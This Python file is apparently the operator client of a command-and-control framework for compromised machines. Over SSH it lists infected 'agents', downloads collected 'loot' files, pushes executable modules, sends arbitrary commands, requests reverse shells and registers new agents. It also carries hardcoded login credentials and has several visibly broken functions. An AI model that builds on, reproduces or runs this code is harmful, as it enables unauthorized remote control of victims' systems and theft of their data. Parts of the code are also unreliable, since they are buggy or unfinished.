from asyncio import Task
import paramiko
import misc
import os
import termios
import fcntl
import select
import sys
import pty
import base64 as b64
import pdb
import time
from struct import pack, unpack
from deprecated import deprecated


# define our enum of types 
Opcode = {
    # mirrors values in common/includes/tasking.h
    "AGENT_RESPONSE_OK": 0,
    "AGENT_RESPONSE_FAIL_GENERIC": 1,


    # mirrors the manager operations in server/includes/values.h
    "MANAGER_RETRIEVE_AGENT": 0xff-1,
    "MANAGER_RETRIEVE_LOOT": 0xff-2,
    "MANAGER_UPLOAD_FILE": 0xff-3,
    "MANAGER_DOWNLOAD_FILE": 0xff-4,
    "MANAGER_PUSH_MODULE": 0xff-5,
    "MANAGER_RUN_COMMAND": 0xff-6,
    "MANAGER_REQUEST_REVERSESHELL": 0xff-7,
    "MANAGER_REGISTER_AGENT": 0xff-8,
    "MANAGER_REVIEW_TRANSPORTS": 0xff-0x9,
    "MANAGER_START_TRANSPORT": 0xff-0xa,
    "MANAGER_EXIT": 0xff-0xb
}


class AgentStruct():
    """Class for holding beacon information"""
    
    def __init__(self, id, connection_time, hostname, interfaces, process_owner):
        self.id = id
        self.connection_time = connection_time
        self.hostname = hostname
        self.interfaces = interfaces
        self.process_owner = process_owner

class TaskingPacket():
    """Class abstracting a tasking packet"""
    
    def __init__(self, op: str, data: bytes):
        """Default initializer that takes the type and data"""
        if type(op) == type(1):
            self.op = op
        else:
            if op not in Opcode:
                print(f"TYPE : {op} NOT FOUND IN OPCODES!")
                exit(1)
            self.op = Opcode[op]
        self.len = 0 # TODO: fix this to immediately calculate the size
        self.data = data

    @staticmethod
    def from_combined(self, combined):
        """Alternative initializer that takes in the packed header"""

        typ = (combined & 0xff00000000000000) >> 56 # (unsigned char) 
        ln  =  combined & 0x00ffffffffffffff        # (unsigned long)
    
    def set_data(self, dat):
        """Set the packet's data"""
        self.data = dat

    def pack(self):
        """Pack the data. Returns bytes of header and data"""
        packet = b""
        a = pack("<B", self.op)
        a = a[0] << 56
        print("Target: ", hex(a | self.len))
        header = pack("<Q", a | self.len)
        packet += bytes(header) + self.data
        return packet

    @staticmethod
    def unpack(datapacket):
        """Return a packet from the on-wire data"""
        h = unpack("<L", datapacket[0:4])
        mask = 0xff << 56
        t = (h & mask) >> 56
        l = (h & ~mask) 
        return TaskingPacket(t, l, datapacket[4:])

    @staticmethod
    def resp_ok():
        """Helper function for making a default 'OK' response"""
        return TaskingPacket("AGENT_RESPONSE_OK", b"").pack()



class Session():
    """Session class handles the network abstraction behind the scenes"""

    def __init__(self, address, port=22, username="aris", password="lala"):
        self.address = address
        self.port = port
        self.username = username
        self.password = password

        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.channel = 0
        self.agents = []

        self.is_working = False

    def lock(self):
        """Lock the session for a sensitive operation"""
        while self.is_working:
            time.sleep(0.1)

        self.is_working = True

    def unlock(self):
        """Unlock the session"""
        self.is_working = False

    def update_addr(self, address):
        """Set the current network address of the server"""
        self.address = address

    def update_port(self, port):
        """Set the port of the server"""
        self.port = port

    def parse_interfaces(self, inp):
        """Parses interfaces from the agent beacon info"""
        interfaces = []
        addresses = []
        ret = []
        data = inp.split(",")
        try:
            for d_set in data:
                d_set = d_set.split(":")
                if d_set[0] == "NA":
                    raise IndexError("Got NA interface data")
                interfaces.append(d_set[0])
                addresses.append(d_set[1])
        except IndexError:
            interfaces.append("NA")
            addresses.append("NA")

        ret.append(interfaces)
        ret.append(addresses)
        return ret

    def init_connection(self):
        """Initializes the connection"""
    
        #pdb.set_trace()
        self.lock()

        # prepare the ssh raw connection
        self.ssh.connect(hostname=self.address, port=self.port, username=self.username, password=self.password, allow_agent=False)

        self.channel = self.ssh._transport.open_session()
        self.channel.invoke_shell()
                
        stdin = self.channel.makefile('wb')
        stdout = self.channel.makefile('r')

        # identify as a manager
        self.channel.sendall("9")
        out = self.clean(self.channel.recv(5))

        # gets all info on current available agents
        self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_AGENT", b'all').pack())
        out = self.clean(self.channel.recv(8196))
        for agent in out:
            print(agent)
            agent = agent.decode(errors="replace")
            if agent != "fi":
                agent = agent.split("\n")
                print(agent)
                if len(agent) < 5:
                    print("Out was too short of a fuckin list")
                else:
                    interfaces = self.parse_interfaces(agent[1])
                    appnd = AgentStruct(agent[0],agent[2],agent[3],interfaces,agent[4])
                    self.agents.append(appnd)
                    print("Added agent successfully")
                self.channel.sendall(TaskingPacket.resp_ok())
                print("Wrote ok to channel")
            else:
                print("caught ending fi")
                out = "fi"
                break
        
        print("[+] Successfully gathered agent information")
        self.unlock()

    
    @staticmethod 
    def init_channel(address, port, user, passwd):
        """Initializes a channel"""
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=address, port=port, username=user, password=passwd, allow_agent=False)
        channel = ssh._transport.open_session()
        channel.invoke_shell()

        stdin = channel.makefile('wb')
        stdout = channel.makefile('r')

        # Initiate the connection
        channel.sendall("0")
        out = channel.recv(5)
        
        print("[+] Successfully gathered agent information")
        return channel


    def update(self):
        """Fetch all new beacons"""
        self.lock()
        quitting = False
        tmp = self.agents
        self.agents = []
        self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_AGENT", b'all').pack())
        
        while not quitting:
            out = self.clean(self.channel.recv(8196))
            if out == []:
                continue
            for entry in out:
                entry = entry.decode(errors="replace")
                print("Entry: " + entry)
                if entry != "fi":
                    entry = entry.split("\n")
                    if len(entry) < 5:
                        print("Out was too short of a fuckin list")
                        continue

                    interfaces = self.parse_interfaces(entry[1])
                    appnd = AgentStruct(entry[0],entry[2],entry[3],interfaces,entry[4])
                    self.agents.append(appnd)
                    self.channel.sendall(TaskingPacket.resp_ok())
                else:
                    quitting = True
                    break
        
        print("[+] Successfully gathered agent information")
        self.unlock()
        return 0

    def download_loot(self, agent_id):
        """Download loot from a particular agent `agent_id`"""
        self.lock()
        filepath = "."#misc.getSavePath()
        data = b""
        ret = b""
        
        if not filepath:
            return 1

        # Send the request
        self.channel.sendall(TaskingPacket("MANAGER_RETRIEVE_LOOT", bytes(agent_id)).pack())
        num = int(self.clean(self.channel.recv(8192))[0].decode(errors="replace"))
        self.channel.send(TaskingPacket.resp_ok())    

        # loop until there is no more
        for i in range(num):
            data = b''
            
            name = self.clean(self.channel.recv(256))
            if name == []:
                pass
            else:
                name = name[0]
                
            print(name)
            name = name.decode(errors="replace")
            if name == 'fi':
                print("received last file successfully")
                break
            
            self.channel.sendall(TaskingPacket.resp_ok())
            
            size = int(self.channel.recv(8192).decode(errors="replace"))
            
            self.channel.sendall(TaskingPacket.resp_ok())
            
            dat = self.channel.recv(size)
            file = open(filepath + "/" + name, "wb")
            data = b64.decodebytes(dat)
            file.write(data) 
            file.close()
            
            ret = self.channel.recv(256).strip(b'\x00')
            if ret != b'fi':
                print("got next")
                
                self.channel.send(TaskingPacket.resp_ok())
                print(ret)
            else:
                print("[+] Got finished notification")
                break  
        print("Complete")
        self.unlock()
        return 0

    def upload_file(self, agent_id, file):
        """Upload a file to the agent `agent_id`"""

        self.lock()
        print("[ ] Doing upload")
        self.channel.sendall(TaskingPacket("MANAGER_UPLOAD_FILE", bytes(agent_id + ":" + file.filename)).pack())
        self.channel.recv(4)
        #print(file.filename)
        #self.channel.send(file.filename)
        #self.channel.recv(4)
        
        # send the data
        buff = b64.encodebytes(file.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(4)
        self.channel.send(buff)
        ret = self.channel.recv(4)
        print("[+] Success")
        self.unlock()
        return 0

    def do_download(self, agent_id, path):
        """Download a specific file"""
        self.lock()
        print("[ ] Doing Download...")
        self.channel.sendall(TaskingPacket("MANAGER_DOWNLOAD_FILE", bytes("%s:%s" % (agent_id, path))).pack())
        self.channel.recv(2)
        print("[+] Tasked agent with download")
        self.unlock()
        return 0

    def push_module(self, agent_id, filestruct):
        """Send a module for `agent_id` to execute"""
        self.lock()
        print("[ ] Pushing module file to agent %s..." % agent_id)
        self.channel.sendall(TaskingPacket("MANAGER_PUSH_MODULE", bytes("%s" % agent_id)).pack())
        self.channel.recv(4)
        self.channel.send(filestruct.filename)
        self.channel.recv(4)
        
        # send the data
        buff = b64.encodebytes(filestruct.data).replace(b'\n', b'')
        
        self.channel.send(str(len(buff)))
        self.channel.recv(4)
        self.channel.send(buff)
        ret = self.channel.recv(4)
        print("[+] Success")
        self.unlock()
        return 0

    def send_command(self, agent_id, command):
        """Send a command for agent `agent_id` to execute"""
        self.lock()
        print("[ ] Sending command to agent...")
        self.channel.sendall(TaskingPacket("MANAGER_RUN_COMMAND", bytes("%s:%s" % (agent_id, command))).pack())
        self.channel.recv(4)
        self.unlock()
        return 0

    def req_revsh(self, agent_id, port):
        """Request a reverse shell from agent `agent_id`"""
        self.lock()
        print("[ ] Sending Reverse Shell Request...")
        self.channel.sendall(TaskingPacket("MANAGER_REQUEST_REVERSESHELL", bytes("%s:%s" % (agent_id, port))).pack())
        self.channel.recv(4)
        self.unlock()
        return 0

    def do_revsh(self, agent_id, port):
        """Run a reverse shell"""
        # for the time being, we just gonna
        # throw this into a separate backgrounded system()
        # because im lazy
        comm = "xterm -e python3 shell.py %s %s %s %s %s &" % (self.address, self.port, self.username, self.password, agent_id)
        os.system(comm)

    def register_agent(self, name, password):
        """Register a login with the server"""
        self.lock()
        print("[ ] Registering agent with server...")
        self.channel.sendall(TaskingPacket("MANAGER_REGISTER_AGENT", bytes('%s:%s' % (name, password))).pack())
        self.channel.recv(4)
        self.unlock()
        return 0

    def get_transports(self):
        """Fetch all available transports from the server"""
        self.lock()
        print("[ ] Getting available backends from server...")
        self.channel.sendall(TaskingPacket("MANAGER_REVIEW_TRANSPORTS", b"").pack())
        quitting = False

        ret = []

        while not quitting:
            try:
                datsz = int(self.clean(self.channel.recv(128))[0].decode(errors="replace"))
                print("Data size: %d" % datsz)

                self.channel.sendall("ok")

                lst = self.clean(self.channel.recv(datsz))
                

                for agent in lst:
                    agent = agent.decode(errors="replace").split("\n")

                    self.channel.send('ok')
                    for entry in agent:
                        if ':' in entry:
                            dat = entry.split(":")
                            print(entry)
                            print("Name: {}, ID: {}".format(dat[0], dat[1]))
                            appnd = misc.Transport(dat[0], int(dat[1]))
                            ret.append(appnd)
                            print("Return size: {}, Append: {}".format(len(ret), appnd))
                        else:
                            print("[-] Caught bad format...")
            
            except ValueError:
                quitting = True
                self.channel.sendall("ok")

            
        self.unlock()
        return ret

    def clean(self, data):
        """cleans a string of data received over the wire"""
        data = data.split(b"\x00")
        ret = []
        
        for i in range(len(data)):
            if data[i] != b"":
                ret.append(data[i])
        

        """for i in range(len(data)): 
            
            if data[i] == 0:
                print("returning modified bytes")
                return data[:i]"""
        print(ret)
        if len(ret) == 0:
            return None
        return ret    
        
    def start_transport(self, transport_id, port):
        """Request a transport be started"""
        self.lock()
        print("[ ] Starting backend with ID %d" % transport_id)
        self.channel.sendall(TaskingPacket("MANAGER_START_TRANSPORT", bytes("%d:%d" % (transport_id, port))).pack())
        self.channel.recv(4)
        self.unlock()
        return 0

    def clean_exit(self):
        """Cleanly terminate itself"""
        self.lock()
        if self.channel != 0:
            self.channel.sendall(TaskingPacket("MANAGER_EXIT", b"").pack())
            self.channel = 0
            print("[+] Backend closed down")

